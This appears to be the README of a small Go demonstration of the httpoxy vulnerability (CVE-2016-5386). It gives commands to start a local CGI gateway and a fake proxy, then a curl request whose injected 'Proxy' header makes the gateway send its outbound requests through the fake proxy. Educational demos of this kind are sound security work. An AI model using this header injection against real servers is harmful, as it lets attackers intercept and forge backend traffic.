go-httpoxy
==========

Golang Example for [httpoxy](https://httpoxy.org/) (CVE-2016-5386)

CGI model refer: [Go中的CGI包使用](http://www.cnblogs.com/yjf512/archive/2012/12/25/2831891.html)

## Gateway

On `7070`
```
go run main.go
```

## Fake Proxy

On `7071`
```
cd fake-proxy && go run main.go
```

## Example

Normal

```
curl 'http://127.0.0.1:7070'
```

Using the vulnerability, and get fake response:

```
curl -H 'Proxy:127.0.0.1:7071' 'http://127.0.0.1:7070'
```
